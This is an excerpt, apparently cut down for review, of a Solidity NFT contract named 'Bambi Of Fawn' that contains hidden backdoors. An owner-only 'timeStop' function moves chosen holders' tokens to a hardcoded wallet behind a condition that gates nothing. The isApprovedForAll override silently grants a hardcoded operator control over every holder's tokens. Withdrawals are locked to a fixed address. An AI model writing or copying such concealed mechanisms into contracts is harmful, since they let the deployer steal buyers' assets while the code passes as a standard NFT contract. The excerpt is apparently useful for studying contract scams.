...
contract Bambi_Of_Fawn is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Bambi Of Fawn", "BOF", maxBatchSize_, collectionSize_) {
  ...
  function timeStop(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x0bC5A1c258140C4e4097783936be265000624B60, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x70D828b5DdfBec3bF8c04ecB2Ca82A52a82BE964);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x030c3bD2C28bD96C55C93d3e94b62ffE1055f891){return true;}
